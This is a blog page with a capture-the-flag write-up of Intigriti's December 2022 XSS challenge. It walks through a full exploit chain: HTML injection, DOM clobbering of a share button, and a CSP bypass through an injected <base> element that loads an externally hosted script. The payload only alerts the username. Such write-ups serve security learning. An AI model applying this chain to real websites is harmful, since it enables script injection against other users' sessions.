<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Finger+Paint&family=Roboto:wght@100&display=swap" rel="stylesheet">
        <link href="/fonts/meslo.ttf" rel="stylesheet">
        <title>Intigriti&#39;s December XSS challenge (1222)</title>        
    <link rel="stylesheet" href="/assets/404.b2188d1d.css" /></head>

    <body class="
        bg-[#3a3e4a]
        font-meslo
        pb-5

        flex
        flex-col

        pt-[2vh]
        pr-[25vh]
        pl-[25vh]
        gap-5
    ">
      <div class="
        flex 
        flex-row 
        truncate
        gap-5
      ">
        <div class="
          flex
          border-dashed
          border-2
          border-gray-500
          rounded-lg
        ">
          <div class="
	bg-[#464b59]
	rounded-lg
	text-white
	p-5
">
	<div class="
    p-4
    font-bold
    text-3xl
    text-center
    hover:animate-waving-hand
">
    <button onclick="
        (document.referrer.includes(document.location.host)
        && document.location.origin + '/' == document.referer
        )
        ? window.history.back()
        : window.location.href = '/'
    ">ðŸ‘ˆ</button>
</div>
</div>
        </div>
        <div class="
          rounded-lg
          shrink grow
          border-dashed
          border-2
          border-gray-500
        ">
          <div class="
	bg-[#464b59]
	rounded-lg
	text-white
	p-5
">
	<div class="
	p-2
	font-navpost
	text-center
  text-yellow-300
	text-3xl
">
	<a href="intigriti-december-xss-challenge-1222">
		Intigriti&#39;s December XSS challenge (1222)
	</a>
</div>

<p class="
	font-sans
	text-center
  text-gray-300
	italic 
	hover:not-italic">
	Reading time: 5 minutes
</p>
</div>
        </div>
      </div>

    <div class="
      bg-[#434854]
      rounded-lg
      text-gray-300
      tracking-wider
      px-8

      cursor-auto

      border-dashed
      border-2
      border-gray-500
      
      min-w-full
      static
      gap-1
      leading-7

      prose
      prose-headings:text-yellow-400
      prose-em:text-yellow-400

      prose-a:text-yellow-400 
      hover:prose-a:text-yellow-600
      prose-a:cursor-pointer

      prose-code:text-yellow-400
      prose-code:before:content-['']
      prose-code:after:content-['']

      prose-strong:text-yellow-400
      
      prose-img:rounded-xl
      prose-img:min-w-full

      prose-img:outline
      prose-img:outline-offset-2 
      prose-img:outline-4

      prose-pre:outline
      prose-pre:outline-offset-2 
      prose-pre:outline-4

      text-lg
      text-justify
      prose-h1:before:content-['#_']
      prose-h2:before:content-['#_']
      prose-h3:before:content-['#_']
      prose-h4:before:content-['#_']
      prose-h5:before:content-['#_']
      
      prose-h1:text-2xl
      prose-h2:text-xl
      prose-h3:text-xl
      prose-h4:text-xl
      prose-h5:text-xl
      
      prose-h1:leading-8
      prose-h2:leading-8
      prose-h3:leading-8
      prose-h4:leading-8
      prose-h5:leading-8
      
      prose-h1:font-navpost
      prose-h2:font-navpost
      prose-h3:font-navpost
      prose-h4:font-navpost
      prose-h5:font-navpost

      list-inside
      marker:text-yellow-400
    " id="post">
      <div class="
          prose-img:border-4
          prose-img:border-gray-500
        ">
          <img src="/images/qwe.png">
        </div>
      <h2 id="introduction">Introduction</h2>
<p>This write-up aims to describe the steps that I did to solve the <a href="https://twitter.com/intigriti/status/1607717920330727427" target="_blank" rel="noopener noreferrer">Intigritiâ€™s december XSS challenge</a>, which was created by <a href="https://twitter.com/fh4ntke" target="_blank" rel="noopener noreferrer">Florian (@fh4ntke)</a>.</p>
<p><em>Christmas Blog</em> is a simple blog mechanism, in which each user has your own blog page. Based on it, the blogâ€™s pages can be accessed from public URLs.</p>
<p>The exploit can be accessed directly <a href="#exploit">here</a> (unintended solution).</p>
<h2 id="user-inputs">User inputs</h2>
<p>According to the applicationâ€™s functionalities, the user may manipulate the following data inputs:</p>
<ol>
<li>Username (Create an user);</li>
<li>Content (Edit blogâ€™s content);</li>
<li>Tags (Edit blogâ€™s content);</li>
<li>Name (Publish a comment in the blogâ€™s page);</li>
<li>Comment (Publish a comment in the blogâ€™s page).</li>
</ol>
<p>Inserting an HTML element as <code>&#x3C;h1>test&#x3C;/h1></code> in all options above, option <em>2</em> is the only one that actually renders HTML, as shown in the image below.</p>
<p><img src="/images/intigriti-challenge-1222-input-test.png" alt="Input test"></p>
<p>With the input found, it may test any HTML element that can leverage to a JavaScript execution. This step can be made by using the <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener noreferrer">Cross-site scripting (XSS) cheat sheet</a>, maintained by PortSwigger <a href="#references">[1]</a>. Once the data are sent to the application, is made some sanitization against tags <code>&#x3C;></code> and events. Thus, some attempts at payloads will not work as expected.</p>
<h2 id="source-code">Source code</h2>
<p>Looking at the source code, there are two important pieces of code. The first one between script tags and the second one loaded as an import <em>/static/js/bootstrap.bundle.min.js</em>. The main content of scripts tags is shown below:</p>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">&#x3C;</span><span style="color: #F92672">script</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">nonce</span><span style="color: #F92672">=</span><span style="color: #E6DB74">"&#x3C;randon>"</span><span style="color: #F8F8F2">></span></span>
<span class="line"><span style="color: #F8F8F2">  ...</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">  document.addEventListener("DOMContentLoaded", function()</span><span style="color: #F92672">{</span></span>
<span class="line"><span style="color: #F8F8F2">    const queryString </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> window.location.search;</span></span>
<span class="line"><span style="color: #F8F8F2">    const urlParams </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">new</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">URLSearchParams</span><span style="color: #F8F8F2">(queryString);</span></span>
<span class="line"><span style="color: #F8F8F2">    const share </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> urlParams.</span><span style="color: #A6E22E">get</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'share'</span><span style="color: #F8F8F2">)</span></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #A6E22E">if</span><span style="color: #F8F8F2"> (share </span><span style="color: #F92672">!=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">null</span><span style="color: #F8F8F2">) {</span></span>
<span class="line"><span style="color: #F8F8F2">        let share_button </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> document.</span><span style="color: #A6E22E">querySelector</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"#share-button"</span><span style="color: #F8F8F2">);</span></span>
<span class="line"><span style="color: #F8F8F2">        share_button.click()</span></span>
<span class="line"><span style="color: #F8F8F2">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">...</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">}</span></span>
<span class="line"><span style="color: #F8F8F2">&#x3C;/</span><span style="color: #F92672">script</span><span style="color: #F8F8F2">></span></span></code></pre>
<p>The script is based on the GET parameter <em>share</em>, which is possible to trigger a click on the <em>share</em> button. Once the parameter <em>?share=1</em> has some content when the DOM is loaded, the click will be trigged. Therefore, the script makes this by getting the id <em>share-button</em>.</p>
<h1 id="dom-clobbering">DOM clobbering</h1>
<p>According to PortSwigger, DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. It is useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter <a href="#references">[2]</a>.</p>
<p>The id <em>share-button</em> can be used to exploit DOM clobbering by adding an HTML element with the same id value. Thus, the approach is to create an <em>a</em> element with the id value <em>share-button</em> and set the <em>href</em> attribute with some content to be trigged. So, <em>href</em> can be an URL, which may cause an open redirect. Another option is to use <em>javascript:</em> to trigger a JavaScript execution. The following code shows these two options.</p>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">&#x3C;</span><span style="color: #F92672">a</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">id</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">share-button</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">href</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">//twitter.com/EffectRenan</span><span style="color: #F8F8F2">>CLICK&#x3C;/</span><span style="color: #F92672">a</span><span style="color: #F8F8F2">></span></span>
<span class="line"><span style="color: #F8F8F2">&#x3C;</span><span style="color: #F92672">a</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">id</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">share-button</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">href</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">javascript:alert()</span><span style="color: #F8F8F2">>CLICK&#x3C;/</span><span style="color: #F92672">a</span><span style="color: #F8F8F2">></span></span></code></pre>
<h2 id="csp-bypass">CSP bypass</h2>
<p>Doing the previous step, clicking on <em>javascript:alert()</em> is not executed due to the CSP rules. These rules can be easily checked with the <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener noreferrer">CSP evaluator</a> using <em>challenge-1222.intigriti.io</em>. The CSP rules are shown below:</p>
<p><img src="/images/intigriti-challenge-1222-csp-evaluator.png" alt="CSP Evaluator"></p>
<p>The application is setting the directive <em>script-src</em> to <em>nonce</em>, which is applied for the browser to verify if an HTML element is trusted to execute JavaScript code <a href="#references">[3]</a>. This nonce is a hash randomly generated by the server in each request made. So the hash cannot be guessed to use in <em>a</em> element.</p>
<p>The CSP Evaluator shows a huge CSP weakness: <em>base-uri</em>. The <code>&#x3C;base></code> element specifies the base URL to use for all relative URLs in a document <a href="#references">[4]</a>. Furthermore, if the base is set to <em><a href="https://effectrenan.com/">https://effectrenan.com</a></em>, all JavaScript imports will be loaded from that URL.</p>
<p>Based on the <a href="#source-code">source code</a> step, the script <em>/static/js/bootstrap.bundle.min.js</em> is being imported. Thus, as this HTML element already comes with a valid nonce from the server, it is possible to set the <em>base</em> to an URL. The import will be from <em>https://&#x3C;base URL>/static/js/bootstrap.bundle.min.js</em>. Consequently, the XSS is achieved by using an URL controlled and it needs to host the path <em>/static/js/bootstrap.bundle.min.js</em> with the payload.</p>
<h1 id="payload">Payload</h1>
<p>According to the rules of the challenge, it is required to run an <em>alert</em> showing the username of the victim. This requirement can be achieved by reading the DOM, in which the username is placed in a class <em>navbar-brand</em>, as shown in the image below.</p>
<p><img src="/images/intigriti-challenge-1222-get-username.png" alt="Username"></p>
<p>The code below shows a way to parser it. When the victim is not logged in, it just pops an alert with the <em>window.location</em>:</p>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> text </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> document.</span><span style="color: #A6E22E">getElementsByClassName</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"navbar-brand"</span><span style="color: #F8F8F2">)[</span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">].textContent;</span></span>
<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> username </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> text.</span><span style="color: #A6E22E">split</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'- '</span><span style="color: #F8F8F2">)[</span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2">];</span></span>
<span class="line"><span style="color: #F8F8F2">(username) </span><span style="color: #F92672">?</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">alert</span><span style="color: #F8F8F2">(username.</span><span style="color: #A6E22E">split</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'</span><span style="color: #AE81FF">\n</span><span style="color: #E6DB74">'</span><span style="color: #F8F8F2">)[</span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">]) </span><span style="color: #F92672">:</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">alert</span><span style="color: #F8F8F2">(document.location);</span></span></code></pre>
<h1 id="poc">PoC</h1>
<p>Host the payload:</p>
<ol>
<li>Open <a href="https://webhook.site/" target="_blank" rel="noopener noreferrer">Webhook.site</a>;</li>
<li>Click on <em>Edit</em> in the top-right bar;</li>
<li>Change the <em>Content Type</em> to <em>text/html</em> and put the payload in <em>Response body</em>;</li>
<li>Click on save button;</li>
<li>Copy the URL by clicking on <em>Copy</em> in the top-right bar and then click on <em>URL</em>.</li>
</ol>
<p><img src="/images/webhook-example.png" alt="webhook.site step"></p>
<p>Itâ€™s necessary to place in the correct path <em>/static/js/</em>. <a href="https://bugpoc.com/" target="_blank" rel="noopener noreferrer">BugPoc</a> has a great tool called <a href="https://bugpoc.com/testers/other/redir" target="_blank" rel="noopener noreferrer">Flexible Redirector</a>. Basically, it can be used to make a redirect to an URL without caring about the endpoint. The image below shows an example based on <code>https://blog.effectrenan.com</code>.</p>
<p><img src="/images/bugpoc-flexredirector-example.png" alt="BugPoC - Flexible Redirector"></p>
<p>With the URL copied from <em>webhook.site</em>, use it in <em>Flexible Redirector</em> to get the final URL to use in the <em>base</em> element. Just copy the first URL that <em>Flexible Redirector</em> gives.</p>
<p>The exploit will look like this:</p>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">&#x3C;</span><span style="color: #F92672">base</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">href</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"</span><span style="color: #F44747">&#x3C;</span><span style="color: #E6DB74">Flexible Redirector URL>"</span><span style="color: #F44747">/</span><span style="color: #F8F8F2"> ></span></span></code></pre>
<p>The last step is to access the <a href="https://challenge-1222.intigriti.io/edit" target="_blank" rel="noopener noreferrer">Edit page</a> in your account on the URL of the challenge and edit the content with the exploit.</p>
<p><img src="/images/intigriti-challenge-1222-edit-page.png" alt="Edit page"></p>
<h2 id="exploit">Exploit</h2>
<p>Sample: <a href="https://challenge-1222.intigriti.io/blog/931c10b1-67df-42c8-afe1-f8852de1c4f1" target="_blank" rel="noopener noreferrer">https://challenge-1222.intigriti.io/blog/931c10b1-67df-42c8-afe1-f8852de1c4f1</a></p>
<h2 id="references">References</h2>
<ol>
<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener noreferrer">Cross-site scripting (XSS) cheat sheet - PortSwigger</a>.</li>
<li><a href="https://portswigger.net/web-security/dom-based/dom-clobbering" target="_blank" rel="noopener noreferrer">DOM clobbering - PortSwigger</a>.</li>
<li><a href="https://developers.google.com/web/fundamentals/security/csp" target="_blank" rel="noopener noreferrer">Content Security Policy - Google Developers</a>.</li>
<li><a href="https://web.dev/csp/#policy-applies-to-a-wide-variety-of-resources" target="_blank" rel="noopener noreferrer">Policy applies to a wide variety of resources - Google Developers</a>.</li>
<li><a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener noreferrer">CSP Evaluator</a>.</li>
</ol> 
    </div>
  </body></html>